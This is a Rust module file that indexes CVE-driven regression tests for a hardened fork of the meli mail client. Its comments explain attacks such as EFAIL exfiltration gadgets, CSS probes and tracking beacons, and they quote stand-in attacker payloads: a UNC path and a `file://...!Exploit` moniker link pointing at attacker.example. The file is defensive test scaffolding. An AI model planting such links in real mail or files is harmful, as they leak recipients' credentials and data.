/*
 * cve - lib.rs
 *
 * Copyright 2026 Kyle Lee
 *
 * SPDX-License-Identifier: EUPL-1.2 OR GPL-3.0-or-later
 */

//! Security CVE workspace of the hardened-meli fork.
//!
//! This crate is the scaffolding for CVE-driven regression tests that target
//! the `meli` and `melib` crates without adding test-only dependencies to
//! the shipped binaries. Every regression follows one pattern: a CVE (or a
//! CVE family), its verbatim attack payload as a fixture, and an inertness
//! or round-trip assertion against the hardened code path — see for example
//! the CVE-2025-66376 tag-splitting corpus that already locks down meli's
//! built-in HTML sanitizer from the `meli` crate.
//!
//! The source-verified research reports live next to this crate:
//!
//! - [SECURITY-CVE-RESEARCH.md](../SECURITY-CVE-RESEARCH.md) — survey of
//!   CVEs delivered through e-mail or directly attacking mail clients and
//!   their rendering path (tracking/privacy, malware/code execution,
//!   web/HTML embedding, e-mail-reachable browser engines, protocol and
//!   crypto trust boundaries);
//! - [SECURITY-CVE-RESEARCH.zh-CN.md](../SECURITY-CVE-RESEARCH.zh-CN.md) —
//!   its Simplified Chinese counterpart.
//!
//! New regressions go into test files under `src/` (unit) or `tests/`
//! (integration); run everything with `cargo test -p cve`.
//!
//! First in-crate regression: MFSA-2005-11 (issue #13), the Thunderbird
//! cookie-tracking advisory — [`mfsa_2005_11`] locks the sanitize →
//! html2text pipeline's immunity against cookie-beacon mail.
//! CVE-2005-2512 (issue #14) extends the corpus approach to the second
//! renders Mail.app leaked on — [`cve_2005_2512`] proves reply-quote,
//! pipe/print, forward and export paths never relax remote-content
//! stripping.
//!
//! CVE-2006-1045 (issue #15) attacks the reference-form side of the
//! same invariant: Thunderbird's "block remote images" preference
//! was bypassed by reference forms it did not classify —
//! [`cve_2006_1045`] proves every form (`<img src>`/`srcset`, CSS
//! `background:url()`, `@import`, `<video poster>`, `<source src>` and
//! relatives) dies in `sanitize` in every embedding context.
//!
//! CVE-2008-3068 (issue #16) moves from the rendering path to the
//! crypto trust boundary: Outlook's CryptoAPI dereferenced AIA/CRL
//! URLs embedded in an S/MIME certificate during revocation checking,
//! turning every mail read into an encrypted-receipt beacon.
//! [`cve_2008_3068`] proves meli's equivalent surface immune with a
//! genuinely signed corpus: the CMS part stays an opaque
//! `CMSSignature` blob, the PGP verification gate never dispatches
//! S/MIME to an engine, and every gpgme context is born offline,
//! local-only and non-retrieving — so no certificate-borne URL can
//! ever be fetched.

//! CVE-2008-4491 (issue #17) turns to the draft store: Apple Mail kept
//! drafts of S/MIME-encrypted mail as plaintext on the server.
//! [`cve_2008_4491`] maps the attack onto meli's composer draft
//! lifecycle with a genuine gpg-encrypted PGP/MIME corpus: the wire
//! form and melib parsing surface no session plaintext, quoting the
//! decrypted view is exactly what serializes it — and the composer's
//! save policy (no auto-save, no silent plaintext persistence of an
//! encryption-armed draft, warnings on explicit saves, encrypted
//! post-submission copies) is what keeps those bytes off the server.
//!
//! CVE-2017-17688 (issue #18) is the EFAIL chapter: OpenPGP CFB
//! malleability grafts an HTML exfiltration gadget onto decrypted
//! plaintext. [`cve_2017_17688`] proves the gadget corpus genuine (real
//! gpg ciphertext, real bit-flip variants, real tampered-decryption
//! outputs) and locks meli's walls: the gadget dies in `sanitize`
//! before rendering, parts never splice, and decryption failure
//! surfaces no plaintext — closing the CLI backend's stdout-echo gap
//! the issue exposed.

/// MFSA-2005-11 (Thunderbird 0.6–0.9 / Mozilla Suite 1.7–1.7.3)
/// cookie-tracking regression (issue #13): an HTML-mail beacon corpus
/// proving the render pipeline performs no remote reference loading —
/// every auto-load vector loses tag and URL in `sanitize`, and the
/// rendered mail is plain terminal text whose only remote references are
/// user-facing link footnotes meli never fetches.
#[cfg(test)]
#[path = "MFSA-2005-11.rs"]
mod mfsa_2005_11;

/// CVE-2005-2512 (Apple Mail.app ≤ 10.4.2) tracking-pixel regression
/// (issue #14): Mail.app fetched remote images when printing or
/// forwarding HTML mail, ignoring the "don't load remote images"
/// preference. This corpus proves meli's equivalent surfaces immune:
/// there is exactly one HTML display pipeline (sanitize → html2text,
/// no fetcher), every second render (reply-quote, pipe/print, forward,
/// export, nested .eml view) reuses or re-enters it with the same
/// strength, and no operation type relaxes beacon stripping.
#[cfg(test)]
#[path = "CVE-2005-2512.rs"]
mod cve_2005_2512;

/// CVE-2006-1045 (Mozilla Thunderbird 1.5) tracking-pixel regression
/// (issue #15): the "block remote images in HTML mail" preference was
/// bypassed and externally linked resources loaded anyway. This corpus
/// proves meli's equivalent surface immune: remote-content stripping is
/// unconditional — every reference form (`<img src>`/`srcset`, CSS
/// `background:url()`, `@import`, `<video poster>`, `<source src>` and
/// era relatives) dies in `sanitize` in every embedding context, and
/// the rendered text keeps only the manual unsubscribe footnote.
#[cfg(test)]
#[path = "CVE-2006-1045.rs"]
mod cve_2006_1045;

/// CVE-2008-3068 (Outlook, Windows Live Mail, Office 2007 CryptoAPI)
/// encrypted-receipt beacon regression (issue #16): an S/MIME mail
/// whose embedded certificate carries attacker AIA/CRL-distribution-
/// point URLs; the victim's client fetched them automatically during
/// CRL revocation checking, leaking read time and IP. The corpus is a
/// genuinely valid openssl-signed S/MIME mail, and the regression
/// proves the equivalent meli surface immune layer by layer: the CMS
/// part parses as an opaque blob whose URLs surface nowhere in mail
/// metadata, the only signature-verification gate rejects non-OpenPGP
/// protocols (and a smuggled carrier still hands the engine opaque
/// bytes only), and every production gpgme context is created offline
/// with local-only key location — per the GPGME manual, offline mode
/// bars Dirmngr's CRL/OCSP validation for CMS and disables Dirmngr
/// entirely for OpenPGP, so no certificate-borne URL is ever
/// dereferenced.
#[cfg(test)]
#[path = "CVE-2008-3068.rs"]
mod cve_2008_3068;

/// CVE-2008-4491 (Apple Mail.app 3.5) plaintext-draft-at-rest regression
/// (issue #17): with "store drafts on server" enabled, drafts of
/// S/MIME-encrypted mail were saved as plaintext on the server, readable
/// by the server operator and intermediaries. This corpus maps the
/// attack onto meli's composer draft lifecycle: a genuine gpg-encrypted
/// PGP/MIME mail whose secrets exist only off the wire; parsing and
/// reply-quoting of the stored form leak nothing; quoting the decrypted
/// session view is what produces the plaintext draft — and the tests
/// document that the bar keeping it off a server-side Drafts mailbox is
/// the composer save policy (no auto-save, submission-setup failures
/// refuse to persist encryption-armed drafts, explicit saves warn,
/// post-submission copies are the encrypted wire form), locked by the
/// meli regressions named in the module docs.
#[cfg(test)]
#[path = "CVE-2008-4491.rs"]
mod cve_2008_4491;

/// CVE-2017-17688 (EFAIL, OpenPGP variant; 11 clients incl. Apple Mail,
/// Thunderbird, Outlook) CFB-malleability exfiltration regression
/// (issue #18): an attacker flips one ciphertext block of an
/// intercepted PGP/MIME mail so the decrypted plaintext opens an
/// unclosed `<img src="https:` gadget whose URL tail is the
/// confidential remainder — and a client that renders it (or echoes it
/// in a decryption error) exfiltrates the plaintext. The corpus is a
/// genuine gpg-encrypted mail plus its two bit-flipped variants (real
/// `gpg --ignore-mdc-error` outputs embedded), and the regression locks
/// the walls layer by layer: the wire carries no plaintext, the
/// tampering is pure CFB XOR, the decrypted gadget dies in `sanitize`
/// before rendering (no fetcher exists to begin with), no code path
/// splices decrypted bytes with attacker-controlled outer parts, and
/// decryption failure surfaces no plaintext fragment — the gap this
/// issue closed: the CLI backend's error used to embed the failing
/// decrypt script's captured stdout byte-for-byte, which GnuPG fills
/// with literal data *before* the MDC verdict.
#[cfg(test)]
#[path = "CVE-2017-17688.rs"]
mod cve_2017_17688;

/// CVE-2017-17689 (EFAIL, S/MIME variant; 11 clients incl. Apple Mail,
/// Thunderbird, Outlook) CBC-malleability exfiltration regression
/// (issue #19): an attacker XORs the IV of an intercepted
/// `application/pkcs7-mime` enveloped-data mail so the first decrypted
/// block becomes an unclosed `<img src="https:` gadget whose URL tail
/// is the confidential remainder — CBC has no integrity check, so the
/// whole tail still decrypts to the original bytes and the decrypting
/// client (or its renderer) exfiltrates the plaintext. The corpus is a
/// genuine openssl S/MIME envelope (AES-128-CBC) plus its IV-flipped
/// variants (real `openssl smime -decrypt` outputs embedded), and the
/// regression locks the walls layer by layer, complementing
/// [`cve_2017_17688`]'s CFB corpus: the wire carries no plaintext,
/// the tampering is a pure 16-byte IV XOR with no damage trail, meli's
/// decrypt entry refuses the single-part S/MIME carrier before any
/// engine is consulted, a smuggled `multipart/encrypted` carrier that
/// does reach an engine fails without leaking plaintext through
/// either real backend, the gadget dies in `sanitize` before
/// rendering, and the direct-exfiltration decoy can never splice with
/// decrypted bytes.
#[cfg(test)]
#[path = "CVE-2017-17689.rs"]
mod cve_2017_17689;

/// CVE-2026-0818 (Thunderbird < 147.0.1, ESR < 140.7.1; MFSA
/// 2026-07/08) CSS-exfiltration regression (issue #20): an HTML+CSS
/// mail wraps an inline OpenPGP block in a stylesheet of extraction
/// oracles — attribute-prefix selectors, `@font-face`
/// `unicode-range` font probes and a `@keyframes`/`steps()` timing
/// probe — and a client that decrypts in place renders the decrypted
/// content *inside the attacker document's CSS context*, leaking the
/// secret one fetch (or one timed tick) per character. The corpus is
/// a genuine gpg-encrypted inline-PGP mail (real cv25519 armor,
/// CRC-24-verified in-test, decrypt-verified round-trip to the
/// embedded plaintext) in both delivery forms — the advisory's
/// `multipart/alternative` (armor mid-prose, never dispatching in
/// meli) and the strongest dispatchable `multipart/mixed` (armor-only
/// part, whose decrypt output re-enters as its own attachment) — and
/// the regression locks the walls layer by layer: the wire carries no
/// plaintext, the whole kit (`<style>`, `style=`, `<link>`, `<font>`,
/// every marker) dies in `sanitize` in every embedding context, the
/// decrypted view renders through its own `sanitize` with the secret
/// delivered but zero probe references, and even the Thunderbird
/// splice (outer kit document concatenated with decrypted HTML, both
/// orders) sanitizes to an inert fixed point — meli's terminal-text
/// pipeline has no CSS engine to inherit from at all.
#[cfg(test)]
#[path = "CVE-2026-0818.rs"]
mod cve_2026_0818;

/// CVE-2023-23397 (Microsoft Outlook on Windows, CVSS 9.8, CISA KEV,
/// APT28) zero-click credential-theft regression (issue #21, table 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// malicious `text/calendar` meeting invite sets the reminder sound
/// (`VALARM` `ATTACH;VALUE=URI`, MAPI `PidLidReminderFileParameter`)
/// to a Windows UNC path `\\attacker.example\share\a.wav`, and
/// Outlook dereferenced it at reminder time with no user interaction,
/// authenticating to the attacker's SMB server with the victim's NTLM
/// credentials. meli has no MAPI store, no reminder subsystem and no
/// SMB client, so the equivalent surfaces — every place
/// mail-controlled bytes can become an "openable link" the OS url
/// launcher dispatches — are mapped and locked: the calendar part
/// renders through the plain-text `InlineText` branch with no
/// iCalendar interpretation, the pager's linkify extraction cannot
/// carry the UNC's backslash tail (and every `file:`/`smb:` URL it
/// does surface is held behind the `go_to_url` confirmation gate),
/// the HTML mirror's scheme-bearing hrefs die in `sanitize`, and —
/// the real gap this issue exposed — the two mail-header-derived
/// launcher sites (`List-Unsubscribe` URL options, `List-Archive`)
/// that used to hand attacker-controlled header bytes straight to
/// `Command::new(url_launcher)` now enforce the same http/https/
/// mailto whitelist, fixed and regression-locked together with the
/// corpus in `meli/src/mail/view.rs` / `meli/src/mail/view/tests.rs`.
#[cfg(test)]
#[path = "CVE-2023-23397.rs"]
mod cve_2023_23397;

/// CVE-2024-21413 (Microsoft Outlook on Windows, CVSS 9.8, public PoC,
/// exploited in the wild) MonikerLink regression (issue #22, table 2
/// of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution): a
/// `file://` URL whose `!`-suffix makes Outlook resolve it as a COM
/// moniker (`file://attacker.example/share/leak.html!Exploit`, with
/// `file:\\`, `search-ms:` and `mhtml:` variants), embedded as a link
/// in the mail body — clicking it bypassed Protected View and made
/// the client dereference the attacker's share over SMB/WebDAV with
/// the victim's NTLM credentials. meli has no Protected View, no COM
/// moniker resolver and no SMB/NTLM client, so the equivalent
/// surfaces — every place a mail-borne link spelling can reach the OS
/// url launcher — are mapped and locked as an immunity proof: the
/// `go_to_url` gate holds the whole moniker family (`file:`, with or
/// without the `!` suffix, `mhtml:`, `search-ms:`, application
/// monikers, UNC, every casing) behind an explicit per-URL
/// confirmation, URL-mode extraction never yields a launchable
/// moniker (the one documented nuance — an `mhtml:https://…` prefix
/// is consumed by extraction, leaving a plain https link
/// byte-identical to what any mail may carry by design — is locked
/// with its mapping rationale), the HTML mirror's scheme-bearing
/// hrefs die in `sanitize`, and the issue #21 header-derived launch
/// sites skip `mhtml:`/`search-ms:`/`file:` options on the same
/// whitelist. No gap was exposed on this corpus; no production code
/// needed changing.
#[cfg(test)]
#[path = "CVE-2024-21413.rs"]
mod cve_2024_21413;

/// CVE-2024-21378 (Microsoft Outlook on Windows, CVSS 8.8, February
/// 2024 Patch Tuesday) open-mail remote-code-execution regression
/// (issue #23, table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus /
/// code execution): processing a crafted message corrupted Outlook
/// memory. meli links no MAPI store, COM runtime or scripting engine,
/// so the equivalent surface is the whole 「receive → parse →
/// display」 path as a class-level memory-safety regression:
/// [`cve_2024_21378`] drives a malformed-MIME corpus (boundary
/// delimiters that used to spin or slice out of bounds, broken
/// base64/quoted-printable/RFC 2047/charset decoding, unexpected
/// nesting combinations) through envelope parsing, tree building,
/// every decode/display conversion and the HTML pipeline with zero
/// panics — and exposes one real gap, fixed with this regression:
/// meli's open-mail display recursion over nested `message/rfc822`
/// (`EnvelopeView::attachment_to_display_helper` and
/// `ViewFilter::new_attachment`) was unbounded, and a mail a few KiB
/// long nested a few thousand levels deep stack-overflowed the 2 MiB
/// view/filter threads the moment it was opened (CWE-674); the fix
/// caps the recursion at `MAX_RFC822_DISPLAY_NESTING_DEPTH`,
/// regression-locked in `meli/src/mail/view/tests.rs` together with
/// the corpus here.
#[cfg(test)]
#[path = "CVE-2024-21378.rs"]
mod cve_2024_21378;

/// CVE-2024-30103 (Microsoft Outlook on Windows, CVSS 8.8, June 2024
/// Patch Tuesday, discovered by Morphisec) crafted-message RCE
/// regression (issue #24, table 2 of
/// `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code execution):
/// processing a specially crafted e-mail executed code because a
/// parsing path filtered attacker input incompletely (CWE-184). meli
/// links no MAPI store, no Outlook Forms engine and no scripting
/// host, so the equivalent surface the issue prescribes is the
/// header parsing path (`melib/src/email/headers.rs` +
/// `melib/src/email/parser.rs`): overlong header values, malformed
/// parameter lists and abnormal encoding combinations must parse
/// with bounded time and memory — no panic, no whole-value expansion
/// allocation. [`cve_2024_30103`] locks that layer by layer and
/// exposes one real gap, fixed with this regression: `phrase()`
/// rescanned for the next `=?` encoded-word opener from every token,
/// so a header value of many whitespace-separated tokens closed by a
/// lone `=?` sentinel was quadratic (CWE-407) — 64 KiB stalled every
/// header's decode for ~17 s and 256 KiB for minutes, an open-mail
/// denial of service through `Subject`, custom headers, display
/// names, attachment names and IMAP envelope strings alike. The fix
/// caches the next opener position so the scan is one forward pass —
/// the width-side sibling of the CVE-2024-21378 depth caps: those
/// bound recursion depth, this bounds rescan width, and they compose
/// without overlap.
#[cfg(test)]
#[path = "CVE-2024-30103.rs"]
mod cve_2024_30103;

/// CVE-2006-2386 (Microsoft Outlook Express ≤ 6, CVSS 2.0 6.8,
/// MS06-076) address-book contact-record RCE regression (issue #29,
/// table 2 of `SECURITY-CVE-RESEARCH.zh-CN.md` — virus / code
/// execution): a crafted contact record in a mail-distributed Windows
/// Address Book (WAB) file executed code in Outlook Express'
/// address book parser. meli links no WAB engine, so the equivalent
/// surfaces the issue prescribes are meli's address book as a class:
/// the vobject vCard parser (`melib/src/utils/vobject`), the
/// production contacts load path (`vcard_folder` → `load_cards` →
/// `CardDeserializer` → `Card`) and the mail-carriage layer that
/// keeps `.vcf`/`.wab` attachments inert. [`cve_2006_2386`] locks
/// malformed contact entries — overlong fields, deep structures,
/// binary garbage — panic-free, bounded and deterministically
/// rejected on all three, and exposes two real gaps fixed with this
/// regression: one binary-garbage `.vcf` in the `vcard_folder` used
/// to abort the whole address book load and blank every contact
/// (CWE-754, now quarantined per file), and multi-card `.vcf` streams
/// loaded only their first contact (RFC 6350 streams, now complete).
#[cfg(test)]
#[path = "CVE-2006-2386.rs"]
mod cve_2006_2386;
